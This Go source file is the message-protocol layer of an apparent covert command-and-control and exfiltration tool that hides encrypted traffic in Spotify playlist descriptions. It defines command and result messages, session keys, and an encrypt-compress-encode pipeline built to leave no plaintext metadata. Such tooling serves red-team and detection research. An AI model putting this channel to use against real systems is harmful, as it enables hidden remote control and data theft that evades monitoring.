// Package protocol handles C2 message serialization, encoding, and chunking.
// All playlist descriptions are fully encrypted -- no plaintext metadata.
package protocol

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/crypto"
	"github.com/sourcefrenchy/spotexfil/internal/encoding"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// Channel discriminators.
var (
	ChannelCmd = shared.Proto.C2.ChannelCmd
	ChannelRes = shared.Proto.C2.ChannelRes
)

// C2Message represents a C2 command or result message.
type C2Message struct {
	Module    string                 `json:"module"`
	Seq       int                    `json:"seq"`
	Args      map[string]interface{} `json:"args,omitempty"`
	Status    string                 `json:"status,omitempty"`
	Data      string                 `json:"data,omitempty"`
	Ts        float64                `json:"ts"`
	SessionID string                 `json:"sid,omitempty"`
	PubKey    string                 `json:"pubkey,omitempty"`
}

// NewC2Message creates a new C2Message with current timestamp.
func NewC2Message(module string, seq int) *C2Message {
	return &C2Message{
		Module: module,
		Seq:    seq,
		Args:   make(map[string]interface{}),
		Ts:     float64(time.Now().Unix()),
	}
}

// ToCommandMap serializes as a command dict for transmission.
func (m *C2Message) ToCommandMap() map[string]interface{} {
	d := map[string]interface{}{
		"module": m.Module,
		"args":   m.Args,
		"seq":    m.Seq,
		"ts":     m.Ts,
	}
	if m.SessionID != "" {
		d["sid"] = m.SessionID
	}
	if m.PubKey != "" {
		d["pubkey"] = m.PubKey
	}
	return d
}

// ToResultMap serializes as a result dict for transmission.
func (m *C2Message) ToResultMap() map[string]interface{} {
	d := map[string]interface{}{
		"seq":    m.Seq,
		"module": m.Module,
		"status": m.Status,
		"data":   m.Data,
		"ts":     m.Ts,
	}
	if m.SessionID != "" {
		d["sid"] = m.SessionID
	}
	if m.PubKey != "" {
		d["pubkey"] = m.PubKey
	}
	return d
}

// FromCommandMap deserializes a command dict.
func FromCommandMap(d map[string]interface{}) *C2Message {
	msg := &C2Message{
		Module:    getString(d, "module"),
		Seq:       getInt(d, "seq"),
		Ts:        getFloat(d, "ts"),
		SessionID: getString(d, "sid"),
		PubKey:    getString(d, "pubkey"),
	}
	if args, ok := d["args"]; ok && args != nil {
		if argsMap, ok := args.(map[string]interface{}); ok {
			msg.Args = argsMap
		}
	}
	if msg.Args == nil {
		msg.Args = make(map[string]interface{})
	}
	return msg
}

// FromResultMap deserializes a result dict.
func FromResultMap(d map[string]interface{}) *C2Message {
	return &C2Message{
		Module:    getString(d, "module"),
		Seq:       getInt(d, "seq"),
		Status:    getString(d, "status"),
		Data:      getString(d, "data"),
		Ts:        getFloat(d, "ts"),
		SessionID: getString(d, "sid"),
		PubKey:    getString(d, "pubkey"),
	}
}

// EncodeMessage encodes a message dict into an encrypted Base64 string.
// Pipeline: JSON -> compress -> BLAKE2b -> AES-GCM -> Base64
func EncodeMessage(messageDict map[string]interface{}, encryptionKey string) (string, error) {
	plaintext, err := json.Marshal(messageDict)
	if err != nil {
		return "", fmt.Errorf("json marshal: %w", err)
	}

	checksum := crypto.ComputeBlake2b(plaintext)
	data := encoding.Compress(plaintext)

	hashBytes := []byte(checksum)
	hashLen := make([]byte, 2)
	binary.BigEndian.PutUint16(hashLen, uint16(len(hashBytes)))

	dataToEncrypt := append(hashLen, hashBytes...)
	dataToEncrypt = append(dataToEncrypt, data...)

	encrypted, err := crypto.Encrypt(dataToEncrypt, encryptionKey)
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}

	return base64.StdEncoding.EncodeToString(encrypted), nil
}

// DecodeMessage decodes an encrypted Base64 string back to a message dict.
func DecodeMessage(b64Payload, encryptionKey string) (map[string]interface{}, error) {
	raw, err := base64.StdEncoding.DecodeString(b64Payload)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %w", err)
	}

	decrypted, err := crypto.Decrypt(raw, encryptionKey)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	if len(decrypted) < 2 {
		return nil, fmt.Errorf("decrypted data too short")
	}
	hashLen := binary.BigEndian.Uint16(decrypted[:2])
	if int(hashLen)+2 > len(decrypted) {
		return nil, fmt.Errorf("invalid hash length")
	}
	storedHash := string(decrypted[2 : 2+hashLen])
	compressed := decrypted[2+hashLen:]

	plaintext, err := encoding.Decompress(compressed)
	if err != nil {
		return nil, fmt.Errorf("decompress: %w", err)
	}

	actualHash := crypto.ComputeBlake2b(plaintext)
	if storedHash != actualHash {
		return nil, fmt.Errorf("C2 message integrity check failed")
	}

	var result map[string]interface{}
	if err := json.Unmarshal(plaintext, &result); err != nil {
		return nil, fmt.Errorf("json unmarshal: %w", err)
	}
	return result, nil
}

// EncodeMessageRaw encodes a message dict using a pre-derived raw AES key (no PBKDF2).
// Used for session-key encrypted messages after ECDH key exchange.
func EncodeMessageRaw(messageDict map[string]interface{}, rawKey []byte) (string, error) {
	plaintext, err := json.Marshal(messageDict)
	if err != nil {
		return "", fmt.Errorf("json marshal: %w", err)
	}

	checksum := crypto.ComputeBlake2b(plaintext)
	compressed := encoding.Compress(plaintext)

	hashBytes := []byte(checksum)
	hashLen := make([]byte, 2)
	binary.BigEndian.PutUint16(hashLen, uint16(len(hashBytes)))

	data := append(hashLen, hashBytes...)
	data = append(data, compressed...)

	encrypted, err := crypto.EncryptFast(data, rawKey)
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}

	return base64.StdEncoding.EncodeToString(encrypted), nil
}

// DecodeMessageRaw decodes an encrypted Base64 string using a pre-derived raw AES key.
// Used for session-key encrypted messages after ECDH key exchange.
func DecodeMessageRaw(b64Payload string, rawKey []byte) (map[string]interface{}, error) {
	raw, err := base64.StdEncoding.DecodeString(b64Payload)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %w", err)
	}

	decrypted, err := crypto.DecryptFast(raw, rawKey)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	if len(decrypted) < 2 {
		return nil, fmt.Errorf("decrypted data too short")
	}
	hashLen := binary.BigEndian.Uint16(decrypted[:2])
	if int(hashLen)+2 > len(decrypted) {
		return nil, fmt.Errorf("invalid hash length")
	}
	storedHash := string(decrypted[2 : 2+hashLen])
	compressed := decrypted[2+hashLen:]

	plaintext, err := encoding.Decompress(compressed)
	if err != nil {
		return nil, fmt.Errorf("decompress: %w", err)
	}

	actualHash := crypto.ComputeBlake2b(plaintext)
	if storedHash != actualHash {
		return nil, fmt.Errorf("C2 message integrity check failed")
	}

	var result map[string]interface{}
	if err := json.Unmarshal(plaintext, &result); err != nil {
		return nil, fmt.Errorf("json unmarshal: %w", err)
	}
	return result, nil
}

// Helper functions for safe type assertions from map[string]interface{}.
func getString(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func getInt(m map[string]interface{}, key string) int {
	if v, ok := m[key]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		case json.Number:
			i, _ := n.Int64()
			return int(i)
		}
	}
	return 0
}

func getFloat(m map[string]interface{}, key string) float64 {
	if v, ok := m[key]; ok {
		switch n := v.(type) {
		case float64:
			return n
		case int:
			return float64(n)
		case json.Number:
			f, _ := n.Float64()
			return f
		}
	}
	return float64(time.Now().Unix())
}
